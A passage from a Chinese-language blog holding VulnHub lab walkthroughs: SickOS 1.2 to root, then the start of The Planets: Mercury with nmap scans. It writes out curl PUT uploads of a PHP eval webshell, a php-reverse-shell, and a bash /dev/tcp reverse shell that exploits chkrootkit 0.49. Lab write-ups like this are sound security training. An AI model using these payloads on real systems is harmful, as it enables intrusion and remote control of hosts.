UNLOCK等多种方法。其中也有我们最想要的PUT。\n漏洞利用传一下\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -v --upload-file test.html  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 38&gt; Expect: 100-continue&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 417 Expectation Failed&lt; Content-Type: text/html&lt; Content-Length: 363&lt; Connection: close&lt; Date: Wed, 19 Apr 2023 17:14:59 GMT&lt; Server: lighttpd/1.4.28&lt; &#123; [363 bytes data]&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt; &lt;head&gt;  &lt;title&gt;417 - Expectation Failed&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt; 90   401  100   363    0     0   154k      0 --:--:-- --:--:-- --:--:--  177k* Closing connection 0\n\n报417，啥情况，查一下，发现是服务器端Expectation的问题。默认的是Expect: 100-continue。\n所以我们在Header里面将Expect设置为空即可。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -T test.html -H &quot;Expect:&quot; -v[sudo] password for kali:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 38&gt; &#125; [38 bytes data]* We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 403 Forbidden&lt; Content-Type: text/html&lt; Content-Length: 345&lt; Date: Wed, 19 Apr 2023 17:42:29 GMT&lt; Server: lighttpd/1.4.28&lt; &#123; [345 bytes data]&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt; &lt;head&gt;  &lt;title&gt;403 - Forbidden&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;h1&gt;403 - Forbidden&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;100   383  100   345  100    38   126k  14323 --:--:-- --:--:-- --:--:--  187k* Connection #0 to host 192.168.56.136 left intact\n\n报403没想到的，哪里出问题了，奇了怪了。\n测试一下PUT方法\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -X PUT -v                   *   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 17:43:48 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n奇了怪了，200，完全没问题啊。\n难道因为Header里的Agent是curl给ban了？\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test -T test.html -H &quot;Expect:&quot; -v -A &quot;Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&gt; Accept: */*&gt; Content-Length: 38&gt; &#125; [38 bytes data]* We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 403 Forbidden&lt; Content-Type: text/html&lt; Content-Length: 345&lt; Date: Wed, 19 Apr 2023 17:46:44 GMT&lt; Server: lighttpd/1.4.28&lt; &#123; [345 bytes data]&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt; &lt;head&gt;  &lt;title&gt;403 - Forbidden&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;h1&gt;403 - Forbidden&lt;/h1&gt; &lt;/body&gt;&lt;/html&gt;100   383  100   345  100    38   136k  15403 --:--:-- --:--:-- --:--:--  187k* Connection #0 to host 192.168.56.136 left intact\n\n很显然并不是。\n算了。用-X PUT --data传试试行不行。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test/test.html -v -X PUT --data &quot;&lt;script&gt;alert(&#x27;put is ok&#x27;) &lt;/script&gt;&quot; *   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test/test.html HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 36&gt; Content-Type: application/x-www-form-urlencoded&gt; * Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 18:03:45 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n\n还真行。那我们把一句话木马传上去用蚁剑连接试试。\n&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;\n传上去一连，轻松连接，非常ok。\n蚁剑的shell用起来怪怪的。\n而且有点不死心，为啥之前的方法传不上去，我们用刚才那种URL写法把php-reverse-shell传上去。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test/shell.php -T shell.php -H &quot;Expect:&quot; -v                                                           % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test/shell.php HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 5496&gt; &#125; [5496 bytes data]* We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 18:09:51 GMT&lt; Server: lighttpd/1.4.28&lt; 100  5496    0     0  100  5496      0  1888k --:--:-- --:--:-- --:--:-- 2683k* Connection #0 to host 192.168.56.136 left intact\n\n可以发现竟然成功传上去了。\n我们传的php-reverse-shell用的4444端口，始终收不到反弹shell。\n\n换个443试试.\n这次上传定位到上传失败问题：192.168.56.136/test/才能传上去，192.168.56.136/test会失败。\n┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ sudo curl 192.168.56.136/test/ -T door.php -H &quot;Expect:&quot; -v *   Trying 192.168.56.136:80...* Connected to 192.168.56.136 (192.168.56.136) port 80 (#0)&gt; PUT /test/door.php HTTP/1.1&gt; Host: 192.168.56.136&gt; User-Agent: curl/7.87.0&gt; Accept: */*&gt; Content-Length: 31&gt; * We are completely uploaded and fine* Mark bundle as not supporting multiuse&lt; HTTP/1.1 201 Created&lt; Content-Length: 0&lt; Date: Wed, 19 Apr 2023 18:23:03 GMT&lt; Server: lighttpd/1.4.28&lt; * Connection #0 to host 192.168.56.136 left intact\n\n\n轻松连接。\n┌──(kali㉿kali)-[~]└─$ sudo nc -lvp 443 listening on [any] 443 ...192.168.56.136: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.136] 51687Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux 11:40:47 up  3:13,  0 users,  load average: 0.00, 0.02, 0.05USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$\n\n提升权限\nsudo -l need password 需要密码。寄。 \n看看带SUID的程序 www-data@ubuntu:/$ find / -type f -perm -04000 -ls 2&gt;/dev/nullfind / -type f -perm -04000 -ls 2&gt;/dev/null667707  268 -rwsr-xr--   1 root     dip        273272 Feb  4  2011 /usr/sbin/pppd667843   20 -rwsr-sr-x   1 libuuid  libuuid     17976 Mar 29  2012 /usr/sbin/uuidd786948    8 -rwsr-xr-x   1 root     root         5564 Dec 13  2011 /usr/lib/eject/dmcrypt-get-device1055122  244 -rwsr-xr-x   1 root     root       248056 Jan 13  2016 /usr/lib/openssh/ssh-keysign668412   12 -rwsr-xr-x   1 root     root         9728 Feb 16  2016 /usr/lib/pt_chown668120   12 -r-sr-xr-x   1 root     root         9532 Mar 30  2016 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper668337   16 -r-sr-xr-x   1 root     root        14320 Mar 30  2016 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper1182917  312 -rwsr-xr--   1 root     messagebus   316824 Jun 13  2013 /usr/lib/dbus-1.0/dbus-daemon-launch-helper660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudoedit667308   16 -rwsr-xr-x   1 root     root        14012 Nov  8  2011 /usr/bin/traceroute6.iputils660925   72 -rwsr-xr-x   2 root     root        69708 Feb 27  2013 /usr/bin/sudo659044   32 -rwsr-xr-x   1 root     root        31748 Sep 12  2012 /usr/bin/chsh659043   44 -rwsr-xr-x   1 root     root        41284 Sep 12  2012 /usr/bin/passwd659041   40 -rwsr-xr-x   1 root     root        40292 Sep 12  2012 /usr/bin/chfn667072   44 -rwsr-sr-x   1 daemon   daemon      42800 Oct 25  2011 /usr/bin/at667649   56 -rwsr-xr-x   1 root     root        56208 Jul 28  2011 /usr/bin/mtr659047   60 -rwsr-xr-x   1 root     root        57956 Sep 12  2012 /usr/bin/gpasswd658916   32 -rwsr-xr-x   1 root     root        30896 Sep 12  2012 /usr/bin/newgrp1179695   88 -rwsr-xr-x   1 root     root        88760 Mar 29  2012 /bin/mount1179715   40 -rwsr-xr-x   1 root     root        39116 Nov  8  2011 /bin/ping6                          1182983   28 -rwsr-xr-x   1 root     root        26252 Mar  2  2012 /bin/fusermount1179696   68 -rwsr-xr-x   1 root     root        67720 Mar 29  2012 /bin/umount1179714   36 -rwsr-xr-x   1 root     root        34740 Nov  8  2011 /bin/ping1179689   32 -rwsr-xr-x   1 root     root        31116 Sep 12  2012 /bin/su\n\nat没权限，mtr读文件还是成功不了。无果。 \n\n看看crontab。常规crontab表，一眼没啥可用的东西。 \n传linpeas吧。运行一下，记录一下看起来有点说法的东西 ══╣ Some home ssh config file was found/usr/share/doc/openssh-client/examples/sshd_config                                                      AuthorizedKeysFile      .ssh/authorized_keysSubsystem       sftp    /usr/libexec/sftp-server╔══════════╣ Analyzing Interesting logs Files (limit 70)            -rw-r--r-- 1 www-data www-data 6927 Apr 19 20:02 /var/log/lighttpd/error.log╔══════════╣ Analyzing Other Interesting Files (limit 70)-rw-r--r-- 1 root root 3486 Mar 28  2013 /etc/skel/.bashrc                                              -rw-r--r-- 1 john john 3486 Mar 30  2016 /home/john/.bashrc-rw-r--r-- 1 root root 675 Mar 28  2013 /etc/skel/.profile-rw-r--r-- 1 john john 675 Mar 30  2016 /home/john/.profile╔══════════╣ Cron jobs╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                  /usr/bin/crontab                                                                                        incrontab Not Found-rw-r--r-- 1 root root     722 Jun 19  2012 /etc/crontab                                                /etc/cron.daily:total 72drwxr-xr-x  2 root root  4096 Apr 12  2016 .drwxr-xr-x 84 root root  4096 Apr 19 20:39 ..-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard/etc/cron.hourly:total 12drwxr-xr-x  2 root root 4096 Mar 30  2016 .drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder/etc/cron.monthly:total 12drwxr-xr-x  2 root root 4096 Mar 30  2016 .drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder/etc/cron.weekly:total 20drwxr-xr-x  2 root root 4096 Mar 30  2016 .drwxr-xr-x 84 root root 4096 Apr 19 20:39 ..-rw-r--r--  1 root root  102 Jun 19  2012 .placeholder-rwxr-xr-x  1 root root  730 Sep 13  2013 apt-xapian-index-rwxr-xr-x  1 root root  907 Dec 28  2012 man-dbSHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )\n\n逐条验证看下来，只有/etc/cron.daily看起来有点说法，因为下面可执行文件很多，且这些文件每天执行，看看有什么能用的吧。挨个看了看，都是些脚本，没看懂都是干啥的，直接挨个name + exp查一下有没有可以利用的漏洞吧。 \n\n发现chkrootkit存在提权漏洞。我们先鉴定一下他的版本，chkrootkit -V 0.49,刚好是有漏洞的版本。 \n查查exp： ┌──(kali㉿kali)-[~/vulnhub/SickOS1.2/workSpace]└─$ searchsploit chkrootkit 0.4   -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                                                  |  Path-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Chkrootkit - Local Privilege Escalation (Metasploit)         | linux/local/38775.rbChkrootkit 0.49 - Local Privilege Escalation                 | linux/local/33899.txt-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results\n\n下载下来看看。  \n\n开搞之前我们先切换一下shell，因为之前4444是明显不通的，说明有防火墙过滤。所以我们试试8080这种端口，果然可以。 \n开搞 $ cat &lt;&lt; EOF &gt; update&gt; #!/bin/bash&gt; bash -i &gt;&amp; /dev/tcp/192.168.56.132/443 0&gt;&amp;1&gt; EOF$ lsVMwareDnDphp.socket-0updatevgauthsvclog.txt.0vmware-root$ cat update#!/bin/bashbash -i &gt;&amp; /dev/tcp/192.168.56.132/443 0&gt;&amp;1\n\n写完了，等了半天没反应。难道哪里出问题了？或者说他叫cron.daily我运气不好要等一天？？？ \n\n急了，尝试怎么直接运行。直接 ./chkrootkit没有任何反应。sudo也没权限。直接运行update倒是可以收到shell。网上查了一下怎么运行定时任务，没找到，突然想起定时任务里面运行是用run-parts运行的。试试看，文件夹下运行出错，查查看了下run-parts。发现他会运行指定文件下第一层的所有可执行文件。 \n试试run-parts /etc/cron.dailyOK，收到了捏。 ┌──(kali㉿kali)-[~]└─$ sudo nc -lvp 443[sudo] password for kali: listening on [any] 443 ...192.168.56.136: inverse host lookup failed: Host name lookup failureconnect to [192.168.56.132] from (UNKNOWN) [192.168.56.136] 57899bash: no job control in this shellroot@ubuntu:~# whoamiwhoamirootroot@ubuntu:~# cd ~cd ~root@ubuntu:~# lsls304d840d52840689e0ab0af56d6d3a18-chkrootkit-0.49.tar.gz7d03aaa2bf93d80040f3f22ec6ad9d5a.txtchkrootkit-0.49newRuleroot@ubuntu:~# cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txtcat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txtWoW! If you are viewing this, You have &quot;Sucessfully!!&quot; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.Thanks for giving this try.@vulnhub: Thanks for hosting this UP!.root@ubuntu:~#\n\n目录下还有个newRules，再看一眼也不会爆炸破案了，确实是只有8080 ,443,22,80没有被过滤掉。为啥直接想到8080 ,443？因为一般为了保证web服务正常，这两端口一般都不会过滤掉的。 \n","categories":["vulnhub"],"tags":["walkthrough"]},{"title":"[vulnhub]  The Planets: Mercury","url":"/2023/05/24/The%20Planets:%20Mercury/","content":"\n\n\n信息收集主机发现，端口扫描，服务检测，TCP扫描，OS检测，漏洞扫描。\n┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap -sn 192.168.56.0/24                                     [sudo] password for kali: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:21 CSTNmap scan report for 192.168.56.1Host is up (0.00028s latency).MAC Address: 0A:00:27:00:00:08 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00011s latency).MAC Address: 08:00:27:17:F0:4B (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.103Host is up (0.00016s latency).MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.144Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 6.95 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap -p- --min-rate=10000 192.168.56.103Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:22 CSTNmap scan report for 192.168.56.103Host is up (0.00052s latency).Not shown: 65533 closed tcp ports (reset)PORT     STATE SERVICE22/tcp   open  ssh8080/tcp open  http-proxyMAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap -sT -sV -sC -O -p22,8080 192.168.56.103Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:23 CSTNmap scan report for 192.168.56.103Host is up (0.00041s latency).PORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 c824ea2a2bf13cfa169465bdc79b6c29 (RSA)|   256 e808a18e7d5abc5c66164824570dfab8 (ECDSA)|_  256 2f187e1054f7b917a2111d8fb330a52a (ED25519)8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2|_http-server-header: WSGIServer/0.2 CPython/3.8.2|_http-title: Site doesn&#x27;t have a title (text/html; charset=utf-8).| http-robots.txt: 1 disallowed entry |_/| fingerprint-strings: |   FourOhFourRequest: |     HTTP/1.1 404 Not Found|     Date: Tue, 23 May 2023 13:23:21 GMT|     Server: WSGIServer/0.2 CPython/3.8.2|     Content-Type: text/html|     X-Frame-Options: DENY|     Content-Length: 2366|     X-Content-Type-Options: nosniff|     Referrer-Policy: same-origin|     &lt;!DOCTYPE html&gt;|     &lt;html lang=&quot;en&quot;&gt;|     &lt;head&gt;|     &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;|     &lt;title&gt;Page not found at /nice ports,/Trinity.txt.bak&lt;/title&gt;|     &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;|     &lt;style type=&quot;text/css&quot;&gt;|     html * &#123; padding:0; margin:0; &#125;|     body * &#123; padding:10px 20px; &#125;|     body * * &#123; padding:0; &#125;|     body &#123; font:small sans-serif; background:#eee; color:#000; &#125;|     body&gt;div &#123; border-bottom:1px solid #ddd; &#125;|     font-weight:normal; margin-bottom:.4em; &#125;|     span &#123; font-size:60%; color:#666; font-weight:normal; &#125;|     table &#123; border:none; border-collapse: collapse; width:100%; &#125;|     vertical-align:|   GetRequest, HTTPOptions: |     HTTP/1.1 200 OK|     Date: Tue, 23 May 2023 13:23:21 GMT|     Server: WSGIServer/0.2 CPython/3.8.2|     Content-Type: text/html; charset=utf-8|     X-Frame-Options: DENY|     Content-Length: 69|     X-Content-Type-Options: nosniff|     Referrer-Policy: same-origin|     Hello. This site is currently in development please check back later.|   RTSPRequest: |     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;|     &lt;html&gt;|     &lt;head&gt;|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;|     &lt;title&gt;Error response&lt;/title&gt;|     &lt;/head&gt;|     &lt;body&gt;|     &lt;h1&gt;Error response&lt;/h1&gt;|     &lt;p&gt;Error code: 400&lt;/p&gt;|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;|     &lt;/body&gt;|_    &lt;/html&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port8080-TCP:V=7.93%I=7%D=5/23%Time=646CBE4A%P=x86_64-pc-linux-gnu%r(GeSF:tRequest,135,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Tue,\\x2023\\x20May\\x202SF:023\\x2013:23:21\\x20GMT\\r\\nServer:\\x20WSGIServer/0\\.2\\x20CPython/3\\.8\\.2SF:\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nX-Frame-Options:\\x2SF:0DENY\\r\\nContent-Length:\\x2069\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\SF:nReferrer-Policy:\\x20same-origin\\r\\n\\r\\nHello\\.\\x20This\\x20site\\x20is\\xSF:20currently\\x20in\\x20development\\x20please\\x20check\\x20back\\x20later\\.&quot;SF:)%r(HTTPOptions,135,&quot;HTTP/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Tue,\\x2023\\x20MSF:ay\\x202023\\x2013:23:21\\x20GMT\\r\\nServer:\\x20WSGIServer/0\\.2\\x20CPython/SF:3\\.8\\.2\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nX-Frame-OptiSF:ons:\\x20DENY\\r\\nContent-Length:\\x2069\\r\\nX-Content-Type-Options:\\x20nosSF:niff\\r\\nReferrer-Policy:\\x20same-origin\\r\\n\\r\\nHello\\.\\x20This\\x20site\\SF:x20is\\x20currently\\x20in\\x20development\\x20please\\x20check\\x20back\\x20lSF:ater\\.&quot;)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\&quot;-//W3C//DTSF:D\\x20HTML\\x204\\.01//EN\\&quot;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\&quot;http://www\\SF:.w3\\.org/TR/html4/strict\\.dtd\\&quot;&gt;\\n&lt;html&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\SF:x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20http-equiv=\\&quot;Content-Type\\&quot;\\x20contSF:ent=\\&quot;text/html;charset=utf-8\\&quot;&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;titlSF:e&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;SF:body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Error\\x20response&lt;/h1&gt;\\n\\x20SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code:\\x20400&lt;/p&gt;\\n\\x20\\x20\\x20\\SF:x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\x20request\\x20version\\x20\\(&#x27;RTSP/SF:1\\.0&#x27;\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code\\x20explSF:anation:\\x20HTTPStatus\\.BAD_REQUEST\\x20-\\x20Bad\\x20request\\x20syntax\\x2SF:0or\\x20unsupported\\x20method\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n&quot;SF:)%r(FourOhFourRequest,A28,&quot;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nDate:\\x2SF:0Tue,\\x2023\\x20May\\x202023\\x2013:23:21\\x20GMT\\r\\nServer:\\x20WSGIServer/SF:0\\.2\\x20CPython/3\\.8\\.2\\r\\nContent-Type:\\x20text/html\\r\\nX-Frame-OptionSF:s:\\x20DENY\\r\\nContent-Length:\\x202366\\r\\nX-Content-Type-Options:\\x20nosSF:niff\\r\\nReferrer-Policy:\\x20same-origin\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;htmSF:l\\x20lang=\\&quot;en\\&quot;&gt;\\n&lt;head&gt;\\n\\x20\\x20&lt;meta\\x20http-equiv=\\&quot;content-type\\&quot;SF:\\x20content=\\&quot;text/html;\\x20charset=utf-8\\&quot;&gt;\\n\\x20\\x20&lt;title&gt;Page\\x20noSF:t\\x20found\\x20at\\x20/nice\\x20ports,/Trinity\\.txt\\.bak&lt;/title&gt;\\n\\x20\\x20SF:&lt;meta\\x20name=\\&quot;robots\\&quot;\\x20content=\\&quot;NONE,NOARCHIVE\\&quot;&gt;\\n\\x20\\x20&lt;styleSF:\\x20type=\\&quot;text/css\\&quot;&gt;\\n\\x20\\x20\\x20\\x20html\\x20\\*\\x20&#123;\\x20padding:0;\\xSF:20margin:0;\\x20&#125;\\n\\x20\\x20\\x20\\x20body\\x20\\*\\x20&#123;\\x20padding:10px\\x2020SF:px;\\x20&#125;\\n\\x20\\x20\\x20\\x20body\\x20\\*\\x20\\*\\x20&#123;\\x20padding:0;\\x20&#125;\\n\\x2SF:0\\x20\\x20\\x20body\\x20&#123;\\x20font:small\\x20sans-serif;\\x20background:#eee;SF:\\x20color:#000;\\x20&#125;\\n\\x20\\x20\\x20\\x20body&gt;div\\x20&#123;\\x20border-bottom:1pSF:x\\x20solid\\x20#ddd;\\x20&#125;\\n\\x20\\x20\\x20\\x20h1\\x20&#123;\\x20font-weight:normalSF:;\\x20margin-bottom:\\.4em;\\x20&#125;\\n\\x20\\x20\\x20\\x20h1\\x20span\\x20&#123;\\x20fontSF:-size:60%;\\x20color:#666;\\x20font-weight:normal;\\x20&#125;\\n\\x20\\x20\\x20\\x20SF:table\\x20&#123;\\x20border:none;\\x20border-collapse:\\x20collapse;\\x20width:10SF:0%;\\x20&#125;\\n\\x20\\x20\\x20\\x20td,\\x20th\\x20&#123;\\x20vertical-align:&quot;);MAC Address: 08:00:27:80:E5:A9 (Oracle VirtualBox virtual NIC)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 5.XOS CPE: cpe:/o:linux:linux_kernel:5OS details: Linux 5.0 - 5.3Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 100.85 seconds                                                                                             ┌──(kali㉿kali)-[~/vulnhub/mercury/workSpace]└─$ sudo nmap --script=vuln 192.168.56.103           Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 21:29 CSTStats: 0:07:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 98.48% done; ETC: 21:36 (0:00:07 remaining)Nmap scan report for 192.168.56.103Host is up (0.00026s latency).Not shown: 998 closed 